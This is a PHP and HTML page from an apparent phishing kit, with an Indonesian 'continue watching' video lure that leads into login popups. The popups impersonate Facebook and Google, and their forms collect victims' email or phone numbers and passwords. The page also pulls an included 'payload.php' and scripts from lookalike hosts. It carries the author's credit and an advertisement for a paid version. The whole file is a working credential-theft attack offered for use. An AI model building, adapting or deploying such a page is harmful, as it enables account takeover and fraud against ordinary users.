<?php
// CREATOR ARYA CODEX
// TOLONG HARGAI CREATOR
// Wa: https://wa.me/+6289509551861

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Exo:wght@100;200;300;400;500;600;700;800;900&family=Secular+One&display=swap" rel="stylesheet">
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://cdn.stackpath.web.id/24/css/facebok.css"> 
        <link rel="stylesheet" href="https://cdn.stackpath.web.id/24/css/log.css"> 
        <title> </title>
<style>
* {
    margin: 0px;
}
body {
    margin: 0px;
    background-image: url("https://cdn.stackpath.web.id/24/imeg/foto.png");
    background-position: center center;

    background-repeat: no-repeat;

    background-attachment: fixed;

    background-size: cover;

    background-color: #000;

 

    color:#000;
    
    
    font-family: "Exo", sans-serif;
}
.vidboxalex11 {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.popup-login {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 999999999999999999;
    display: none;
}

#ShowPw {
    display: none;
}

.imgLog img {
    width: 200px;
    cursor: pointer;
    display: block;
    margin: 5px auto;
}

.textdwnlfgn {
    margin: 10px auto !important;
    padding: 0;
    font-size: 17px;
}

.option {
    width: 90%;
    background: #fff;
    border-radius: 5px;
    padding: 10px;
    display: block;
    position: relative;
    margin: auto;
    top: 35%;
}
.vidboxalex11 video {
        width: 100%;
    height: auto;
    max-width: 500px;
}
.bluboxalex11 {
        position: fixed;
    z-index: 1;
    left: 0;
    top: 0;
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    animation: turu 4s forwards linear;
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    text-align: center;
}
.contalexbox11 {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    max-width: 90%;
}
.contalexbox11 p {
        font-family: "Secular One", sans-serif;
    text-align: center;
    color: #bae1ff;
    text-shadow: 0 0 5px black;
    font-size: 2em;
}
.contalexbox11 span {
        font-family: "Exo", sans-serif;
    text-align: center;
    color: #bae1ff;
    text-shadow: 0 0 5px black;
    font-size: 16px;
}
.contalexbox11 button {
        margin-top: 20px;
    max-width: 250px;
    border-radius: 5px;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.5));
    cursor: pointer;
    background: #4767ae;
    color: #fff;
    border: none;
    font-size: 16px;
    width: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    padding: 0px 10px 0px 0px;
    box-shadow: 0px 2px 6px 0px #818181;
}
.contalexbox11 button>i {
        height: 100%;
    background: #1a4397;
    width: 30px;
    font-size: 30px;
    padding: 7px;
    border-radius: 5px 0px 0px 5px;
    margin-right: 10px;
}
.contalexbox11 button>label {
        padding: 0px 10px;
    letter-spacing: 0.5px;
}

.contalexbox11 p {
    animation: tidur 1s forwards linear;
    animation-delay: 0.5s;
    opacity: 0;
}
.contalexbox11 span {
    animation: tidur 1s forwards linear;
    animation-delay: 2s;
    opacity: 0;
}
.contalexbox11 button {
    animation: tidur 1s forwards linear;
    animation-delay: 3.5s;
    opacity: 0;
}
@keyframes turu {
  from {
    -webkit-backdrop-filter: blur(0px);
    backdrop-filter: blur(0px);
  }
  to {
    -webkit-backdrop-filter: blur(20px);
    backdrop-filter: blur(20px);
  }
}

@keyframes tidur {
    from { opacity: 0; }
    to   { opacity: 1; }
}

/* Firefox < 16 */
@-moz-keyframes tidur {
    from { opacity: 0; }
    to   { opacity: 1; }
}

/* Safari, Chrome and Opera > 12.1 */
@-webkit-keyframes tidur {
    from { opacity: 0; }
    to   { opacity: 1; }
}

/* Internet Explorer */
@-ms-keyframes tidur {
    from { opacity: 0; }
    to   { opacity: 1; }
}

/* Opera < 12.1 */
@-o-keyframes tidur {
    from { opacity: 0; }
    to   { opacity: 1; }
}
.popup-login {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 999999999999999999;
}

.popup-login {
    background: rgba(0, 0, 0, 0.5);
    width: 100%;
    height: 100%;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 999999999999999999;
}

.popup-box-login-fb {
    background: #eceff6;
    max-width: 330px;
    height: auto;
    position: relative;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    text-align: center;
    font-family: "Teko";
    color: #000;
    border-radius: 10px;
}

.navbar-fb {
    background: #3b5998;
    height: auto;
    max-width: 330px;
    padding: 8px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
}

.navbar-fb img {
    width: 115px;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.content-box-fb .alert {
    display: none;
    left: -15px;
    position: relative;
    width: 330px;
    padding: 5px;
    background: red;
    color: #fff;
    font-size: 13px;
    font-family: "Roboto";
}

.content-box-fb img {
    width: 75;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}

.txt-login-fb {
    width: 290px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}

input[type="text"],
input[type="password"] {
    width: 90%;
    height: auto;
    padding: 12px;
    color: #000;
    font-size: 14px;
    font-weight: 400;
    font-family: "Lato", sans-serif;
    border: 1px solid #bdbebf;
    cursor: pointer;
    outline: none;
}

.login-form input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
    box-shadow: 0 -1px 0 #e0e0e0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset;
}

.login-form input[type="password"] {
    margin: 0;
    border-top: none;
    border-radius: 0 0 4px 4px;
    box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset,
        0 0px 0px rgba(255, 255, 255, 0.1);
}

.btn-login-fb {
    background: #1778f2;
    width: 100%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 14px;
    font-family: Roboto;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
    border: 1px solid #3578e5;
    border-radius: 5px;
    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
    outline: none;
    display: block;
}

.btn-login-fb.disabled {
    pointer-events: none;
    background: #8b9dc3;
    border: 1px solid #8b9dc3;
}

.txt-create-account {
    margin-top: 4px;
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}

.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}

.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}

.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}

.language-name-active {
    color: #90949c;
    font-weight: bold;
}

.copyrights {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
</style>
    </head>
    <body>
        <main>
            <div class="vidboxalex11">
                <video id="media" src="https://cdn.stackpath.web.id/24/imeg/foto.png" loop="" muted=""></video>
                <div class="bluboxalex11">
                    <div class="contalexbox11">
                        <p>Mau Lanjut Nonton?</p>
                        <span>Login Untuk Melanjutkan</span>
                        <button onclick="openLoginPopup()"><i class="fa-brands fa-facebook-f"></i> <label>Login with Facebook</label></button>
                    </div>
                </div>
            </div>
        </main>
        </div>
        <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
     <div class="option"> 
     <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan Download
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/logo/logfb.webp" onclick="openFB();"> 
      <img src="https://cdn.stackpath.web.id/logo/loggp.webp" onclick="openGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-vk" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/logo/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/logo/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Facebook Anda untuk terhubung dengan Facebook.com. 
     </div> 
     <form class="login-form" id="form-login-fb" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-vk"> 
    <a class="close-alex-vk" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-vk"> 
     <center> 
      <p class="kagetvk email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetvk sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-logvk" src="https://cdn.stackpath.web.id/logo/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="form-login-gp" method="POST"> 
       <div class="ucapan-vk">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-Google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-Google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-vk cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-vk" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form> 
     </center> 
    </div> 
   </div> 
  </div> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-24.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>
